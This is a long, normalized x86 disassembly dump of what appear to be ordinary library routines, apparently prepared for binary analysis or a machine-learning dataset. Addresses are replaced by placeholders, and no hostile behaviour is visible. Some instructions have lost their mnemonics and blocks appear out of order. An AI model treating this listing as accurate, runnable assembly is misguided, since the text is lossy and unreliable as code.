xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
retn
push edi
push ebx
call sub_1001e7c0
mov esi [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
call sub_100562e0
add esp 0x10
test eax eax
je r-xdata
push 0x9d
push r--data
push 0x83
push 0x7d
push 0x22
call sub_1001de60
add esp 0x14
push 0xffffffff
push esi
push eax
lea eax [ esp + 0x18 ]
push eax
call sub_10060300
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
push ebx
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jge r-xdata
jmp r-xdata
sub_10060300
mov edx [ esp + 0x4 ]
push ebx
push ebp
xor ebx ebx
push esi
push edi
test edx edx
je r-xdata
push 0xbd
push r--data
push 0x6b
push 0x7e
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
mov ebp [ esp + 0x20 ]
cmp ebp 0xffffffff
jne r-xdata
cmp ebp 0x40
jle r-xdata
or ecx ebp
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
mov esi [ edx ]
test esi esi
jne r-xdata
push 0xc2
push r--data
push 0x84
push 0x7e
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x4 ]
xor edi edi
push edx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push r--data
call sub_10033120
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push r--data
call sub_10033120
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov eax [ esi + 0x4 ]
push edi
push eax
call sub_1001e7c0
mov ecx [ esp + 0x20 ]
mov ebx eax
push ecx
mov edx [ ebx ]
push edx
call sub_1002ee40
add esp 0x10
test eax eax
je r-xdata
push 0xd8
push r--data
push 0x41
push 0x7e
push 0x22
call sub_1001de60
push r--data
push ebx
call sub_10033840
push r--data
push esi
call sub_10033840
mov ecx [ esp + 0x38 ]
add esp 0x24
xor eax eax
pop edi
pop esi
pop ebp
mov [ ecx ] 0x0
pop ebx
retn
mov eax [ esi ]
push 0x0
push eax
call sub_1002f410
add esp 0x8
test eax eax
je r-xdata
cmp ebp 0xffffffff
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
inc edi
push eax
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] esi
mov ecx [ esp + 0x1c ]
mov edx [ ebx + 0x4 ]
push ebp
push ecx
push edx
call sub_1002ec90
add esp 0xc
test eax eax
je r-xdata
mov edi [ esp + 0x1c ]
or ecx ebp
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
push 0xcb
push r--data
push 0x85
push 0x7e
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x4 ]
push ebx
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
pop edi
pop esi
mov [ ebx ] edx
pop ebp
mov eax 0x1
pop ebx
retn
sub_100604d0
push esi
mov esi [ esp + 0xc ]
push edi
push esi
call sub_10061060
mov edx [ esp + 0x10 ]
add esp 0x4
mov ecx [ edx + 0x34 ]
mov edi [ ecx + 0x4 ]
test edi edi
je r-xdata
push esi
push edx
call sub_10056220
add esp 0x8
pop edi
pop esi
retn
cmp eax [ ecx ]
je r-xdata
mov eax [ ecx + 0x4 ]
push eax
call sub_100266f0
add esp 0x4
pop edi
pop esi
retn
mov edi [ ecx + 0x10 ]
add ecx 0xc
test edi edi
jne r-xdata
sub_10060520
push ebx
mov ebx [ esp + 0xc ]
push edi
push ebx
xor edi edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop ebx
retn
push esi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push r--data
push r--data
call sub_10055f50
add esp 0xc
lea eax [ esp + 0x18 ]
push eax
push r--data
push r--data
call sub_10055f50
add esp 0xc
mov ecx [ esp + 0x18 ]
mov edx [ eax + 0x4 ]
push ecx
push edx
push 0x0
call sub_10050c60
add esp 0xc
mov [ esp + 0x18 ] eax
jmp r-xdata
push ebx
inc edi
call sub_1001e7b0
add esp 0x4
cmp edi eax
jl r-xdata
lea edx [ esp + 0x18 ]
push edx
push r--data
push r--data
call sub_10055f50
add esp 0xc
push edi
push ebx
call sub_1001e7c0
mov esi eax
add esp 0x8
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
pop esi
pop edi
pop ebx
retn
sub_100605e0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
xor ebp ebp
xor edi edi
call sub_1001e3c0
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
push 0x83
push r--data
push 0x41
push 0x86
push 0x22
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x20 ]
xor ebx ebx
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ecx [ esp + 0x20 ]
push ebx
push ecx
call sub_1001e7c0
mov edx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push edx
push eax
call sub_10051630
mov edi eax
add esp 0x14
test edi edi
je r-xdata
push edi
call sub_100340f0
push ebp
call sub_10034130
mov ecx [ esp + 0x18 ]
push sub_10060730
push ecx
call sub_1001e730
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
call sub_10034120
mov ebp eax
test ebp ebp
je r-xdata
push edi
push ebp
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push r--data
xor edi edi
call sub_10033120
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push r--data
push esi
call sub_10033840
add esp 0x8
push r--data
call sub_10033120
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov [ eax + 0x4 ] ebp
mov edx [ esi ]
mov eax [ esp + 0x20 ]
xor ebp ebp
push eax
mov [ edx ] edi
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
sub_10060760
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x8 ]
push ecx
push edx
call sub_10056ea0
mov esi eax
lea eax [ esp + 0x1c ]
push eax
push esi
push r--data
call sub_10055f50
push esi
call sub_1001d740
add esp 0x18
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
push eax
push 0x0
call sub_10050c60
add esp 0xc
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x14 ]
pop edi
pop esi
retn
mov edx [ eax ]
mov eax [ eax + 0x8 ]
push edx
push eax
call sub_10056ea0
lea ecx [ esp + 0x1c ]
mov esi eax
push ecx
push esi
push r--data
call sub_10055f50
push esi
call sub_1001d740
add esp 0x18
sub_100607f0
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
push edi
xor edi edi
xor ebp ebp
push eax
mov [ esp + 0x17 ] 0x0
xor bl bl
mov [ esp + 0x20 ] ebp
mov [ esp + 0x18 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x1c ] edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x30 ]
cmp eax edi
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x34 ]
push ecx
push edx
call sub_1001e7c0
mov ebp eax
add esp 0x8
mov esi r--data
mov edi [ ebp + 0x4 ]
mov eax edi
push 0x99
push r--data
push 0x79
mov esi [ eax + 0x4 ]
cmp esi edi
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
cmp [ eax ] 0x1
jne r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov esi r--data
mov eax edi
mov eax [ ebp + 0x8 ]
mov [ esp + 0x13 ] 0x1
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
call sub_10035550
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
test bl bl
je r-xdata
push 0xffffffff
push 0x52
push esi
call sub_10036790
add esp 0xc
cmp eax edi
jl r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov esi [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
inc esi
push eax
mov [ esp + 0x1c ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov esi r--data
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp ebp edi
je r-xdata
cmp [ esp + 0x13 ] 0x2
jne r-xdata
push eax
push esi
call sub_100367b0
add esp 0x8
cmp eax edi
je r-xdata
push 0x8f
push r--data
push 0x78
push 0x77
push 0x22
call sub_1001de60
mov ecx [ ebp + 0x4 ]
push ecx
push r--data
push 0x2
call sub_1001e1a0
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov eax [ ebp + 0x8 ]
mov bl 0x1
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov ebp [ esp + 0x1c ]
xor edi edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
call sub_10035550
mov esi eax
cmp esi edi
je r-xdata
push esi
call sub_10021330
push eax
call sub_10020230
mov edi eax
push esi
mov [ esp + 0x20 ] edi
call sub_1002b5c0
push eax
call sub_1002ebe0
add esp 0x10
mov [ esp + 0x20 ] eax
test edi edi
je r-xdata
cmp ebp edi
jne r-xdata
push eax
call sub_10055cb0
add esp 0x4
mov [ esp + 0x1c ] eax
mov ebp eax
mov esi r--data
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov [ esp + 0x13 ] 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
call sub_10020210
mov ecx [ esp + 0x24 ]
push ecx
call sub_1002ee10
push ebp
call sub_1002ee10
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
cmp [ esp + 0x14 ] edi
je r-xdata
push 0xb1
push r--data
push 0x7a
jmp r-xdata
test eax eax
jne r-xdata
push 0xa6
push r--data
push 0x7b
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edx
mov [ esi ] ebp
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
call sub_1001e3c0
mov ebx eax
cmp ebx edi
mov [ esp + 0x24 ] ebx
je r-xdata
push 0x77
push 0x22
call sub_1001de60
add esp 0x14
xor edi edi
push 0x77
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
mov bl 0x2
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
push 0xbe
push r--data
push 0x41
call sub_100340e0
mov edi eax
test edi edi
je r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push edi
push ebx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ esp + 0x14 ]
mov [ edi ] 0x4
mov [ edi + 0x4 ] edx
sub_10060b30
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
push rw-data
push eax
push r--data
push esi
call sub_10026b40
mov edi [ esp + 0x20 ]
add esp 0x10
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0xc
push r--data
push esi
call sub_100209d0
mov ecx [ edi ]
push ecx
push esi
call sub_10066d80
mov eax [ edi + 0x4 ]
add esp 0x14
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
push 0xb
push r--data
push esi
call sub_100209d0
mov edx [ edi + 0x4 ]
push edx
push esi
call sub_10066d80
add esp 0x14
push 0x2
push r--data
push esi
call sub_100209d0
add esp 0xc
sub_10060bb0
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax + 0x34 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop esi
retn
push edi
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x10 ]
add esi 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x14 ]
push edx
push 0x0
push eax
call sub_10055f50
add esp 0xc
mov ecx [ esi ]
push ecx
push edi
call sub_10050c10
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
retn
sub_10060c00
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push 0x3
call sub_1002edc0
mov ebx eax
add esp 0x4
test ebx ebx
mov [ esp + 0x10 ] ebx
jne r-xdata
mov edi [ esp + 0x28 ]
xor esi esi
push edi
mov [ esp + 0x1c ] esi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x71
push r--data
push 0x41
push 0x65
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0xc
retn
push esi
push edi
call sub_1001e7c0
mov esi eax
mov eax [ esp + 0x28 ]
add esp 0x8
mov [ esp + 0x14 ] esi
mov ebp [ eax + 0x34 ]
mov edi [ ebp + 0x4 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x4 ]
push 0x84
push r--data
push 0x6f
push 0x65
push 0x22
call sub_1001de60
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
mov eax [ esp + 0x40 ]
push eax
call sub_1002ee10
add esp 0x34
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x28 ]
inc esi
push edi
mov [ esp + 0x1c ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov ebx [ esp + 0x10 ]
mov eax [ ebp ]
mov ecx [ esp + 0x10 ]
push 0x1
push eax
push ecx
call sub_10050ae0
add esp 0xc
test eax eax
je r-xdata
mov esi ebx
mov eax edi
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
push 0x7b
push r--data
push 0x41
push 0x65
push 0x22
call sub_1001de60
mov edx [ esp + 0x24 ]
push edx
call sub_1002ee10
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov esi [ esp + 0x14 ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov edi [ ebp + 0x10 ]
add ebp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi ebx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_10060de0
mov eax 0x44
call sub_1001d0d0
push ebx
push esi
push edi
mov edi [ esp + 0x5c ]
mov esi r--data
mov eax edi
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
call sub_1002edc0
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov ecx [ esp + 0x58 ]
test ecx ecx
je r-xdata
push 0x70
push r--data
push 0x41
push 0x73
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x44
retn
lea eax [ esp + 0x5c ]
push eax
push edi
call sub_10056f30
add esp 0x8
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push 0x56
push r--data
push 0x41
push 0x70
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x44
retn
test eax eax
push 0x4
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push 0x77
cmp [ ecx ] 0x1
jne r-xdata
mov ecx [ esp + 0x5c ]
mov eax esi
mov [ esi ] ecx
pop edi
pop esi
pop ebx
add esp 0x44
retn
push esi
call sub_1002ee10
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x44
retn
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x44
retn
mov edx [ eax ]
mov eax [ edx + 0x14 ]
jmp r-xdata
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
mov esi [ eax + 0x4 ]
test esi esi
jne r-xdata
test eax eax
je r-xdata
push 0x0
call sub_100254d0
lea ecx [ esp + 0x10 ]
push eax
mov eax [ esi ]
lea edx [ esp + 0x18 ]
push ecx
mov ecx [ esi + 0x8 ]
push edx
push eax
push ecx
call sub_1002ad90
mov edx [ esp + 0x24 ]
lea eax [ esp + 0x28 ]
push edx
push eax
push edi
call sub_1002ec90
add esp 0x24
test eax eax
jne r-xdata
push 0x80
jmp r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
push 0x87
push r--data
push 0x41
jmp r-xdata
push r--data
push 0x72
push 0x73
push 0x22
call sub_1001de60
add esp 0x14
push edi
call sub_1002ee10
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x44
retn
sub_10060f70
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx ]
test eax eax
je r-xdata
push 0x55
inc eax
push r--data
push eax
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebx ]
push esi
mov esi [ ebx + 0x8 ]
mov edx ecx
push edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx ]
pop edi
pop esi
pop ebx
mov [ ecx + eax ] 0x0
retn
push 0x56
push r--data
push 0x41
push 0x95
push 0x22
call sub_1001de60
add esp 0x14
sub_10060fe0
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
push esi
jne r-xdata
push 0x16
call sub_1002edc0
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push 0x63
push r--data
push 0x6b
push 0x64
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebx
retn
push 0x71
push r--data
push 0x41
push 0x64
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebx
retn
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push esi
call sub_1002ec90
add esp 0xc
test eax eax
pop edi
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
push esi
call sub_1002ee10
add esp 0x4
sub_10061060
mov ecx [ esp + 0x4 ]
push ebp
xor ebp ebp
xor eax eax
push esi
push edi
test ecx ecx
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp edx 0x10a
jne r-xdata
pop edi
pop esi
pop ebp
retn
cmp edx 0xa
je r-xdata
mov ebp 0x1
mov esi [ ecx ]
cmp esi 0x4
jle r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
retn
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
retn
xor ecx ecx
test esi esi
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
test ebp ebp
je r-xdata
xor edx edx
mov dl [ edi + ecx ]
shl eax 0x8
or eax edx
inc ecx
cmp ecx esi
jl r-xdata
pop edi
pop esi
pop ebp
retn
neg eax
sub_100610d0
mov eax [ esp + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
push eax
mov ecx [ edi ]
mov edx [ edi + 0x8 ]
push ecx
push edx
call sub_10029d50
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
cmp [ edi + 0x4 ] 0x10a
jne r-xdata
push 0xb3
push r--data
push 0x69
push 0x71
push 0xd
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
retn
mov eax esi
pop edi
pop esi
retn
push 0x1
push esi
call sub_1002a190
add esp 0x8
sub_10061130
push ebx
push ebp
mov ebp [ esp + 0x1c ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov eax [ esp + 0x18 ]
push eax
push esi
call strchr
mov ebx eax
add esp 0x8
cmp ebx esi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
push ebp
push 0x0
push 0x0
cmp [ esi ] 0x0
je r-xdata
and eax 0xff
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
mov eax 0x1
lea esi [ ebx + 0x1 ]
jmp r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea edi [ ecx + esi - 0x1 ]
lea edi [ ebx - 0x1 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
sub edi esi
push ebp
inc edi
push edi
push esi
jmp r-xdata
xor ecx ecx
mov cl [ edi ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
call [ esp + 0x2c ]
add esp 0xc
test eax eax
jle r-xdata
dec edi
xor edx edx
mov dl [ edi ]
push edx
call isspace
add esp 0x4
test eax eax
jne r-xdata
sub_100611f0
push esi
push edi
push 0x70
push r--data
push 0x34
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
mov [ esi ] edi
call sub_10034160
cmp eax edi
mov [ esi + 0x4 ] eax
jne r-xdata
push 0x70
push r--data
push 0x41
push 0xad
push 0xd
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
retn
push 0x4
call sub_1002edc0
add esp 0x4
cmp eax edi
mov [ esi + 0x8 ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
lea ecx [ esi + 0x20 ]
xor eax eax
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ ecx ] eax
pop edi
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ esi + 0x30 ] 0x1
mov eax esi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
sub_10061280
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x85
push r--data
push 0x5
lea eax [ esi + 0x30 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call sub_10034170
add esp 0x4
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_1002ee10
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call sub_10023940
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
push eax
call sub_1001d740
add esp 0x4
sub_10061300
push esi
push 0x50
push r--data
push 0x18
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x53
push r--data
push 0x41
push 0x68
push 0x28
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov [ esi ] eax
lea eax [ esi + 0xc ]
push eax
push esi
push 0xb
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_1001f420
add esp 0xc
mov eax esi
pop esi
retn
call sub_10068160
mov [ rw-data ] eax
sub_10061370
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
push sub_100613a0
push eax
call sub_1001e730
lea ecx [ esi + 0xc ]
push ecx
push esi
push 0xb
call sub_1001f490
push esi
call sub_1001d740
add esp 0x18
sub_100613a0
push esi
mov esi [ esp + 0x8 ]
test [ esi + 0x1c ] 0x1
je r-xdata
push esi
call sub_1001d740
add esp 0x4
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_1001d740
mov eax [ esi ]
add esp 0x4
cmp eax 0x3
jne r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_1001d740
mov edx [ esi + 0x14 ]
push edx
call sub_1001d740
mov eax [ esi + 0x18 ]
push eax
call sub_1001d740
add esp 0xc
sub_100613f0
push ebx
mov ebx [ esp + 0xc ]
push esi
or esi 0xffffffff
test ebx ebx
push edi
jne r-xdata
mov edi [ esp + 0x1c ]
test edi edi
jne r-xdata
push 0x93
push r--data
push 0x43
push 0x6d
push 0x28
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x9a
push r--data
push 0x20
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x98
push r--data
push 0x69
push 0x6d
push 0x28
call sub_1001de60
add esp 0x14
mov eax esi
pop edi
pop esi
pop ebx
retn
or eax 0xffffffff
mov eax [ esp + 0x18 ]
mov [ esi + 0xc ] edi
mov edi [ esp + 0x10 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x8 ] eax
mov [ esi ] 0x1
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] 0x0
mov eax [ edi + 0x4 ]
push esi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
jg r-xdata
call sub_1001e3c0
test eax eax
mov [ edi + 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
pop edi
pop esi
dec eax
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
push esi
call sub_1001d740
add esp 0x4
mov ecx [ esi + 0x4 ]
push ecx
call sub_1001d740
mov eax [ esi ]
add esp 0x4
cmp eax 0x3
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
call sub_1001d740
mov eax [ esi + 0x14 ]
push eax
call sub_1001d740
mov ecx [ esi + 0x18 ]
push ecx
call sub_1001d740
add esp 0xc
sub_10061510
push ebx
mov ebx [ esp + 0xc ]
push ebp
or ebp 0xffffffff
push esi
push edi
test ebx ebx
jne r-xdata
mov edi [ esp + 0x20 ]
test edi edi
jne r-xdata
push 0x93
push r--data
push 0x43
push 0x6d
push 0x28
call sub_1001de60
add esp 0x14
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x9a
push r--data
push 0x20
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push 0x98
push r--data
push 0x69
push 0x6d
push 0x28
call sub_1001de60
add esp 0x14
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax ebp
mov eax [ esp + 0x1c ]
mov [ esi + 0xc ] edi
mov edi [ esp + 0x14 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x1c ] 0x0
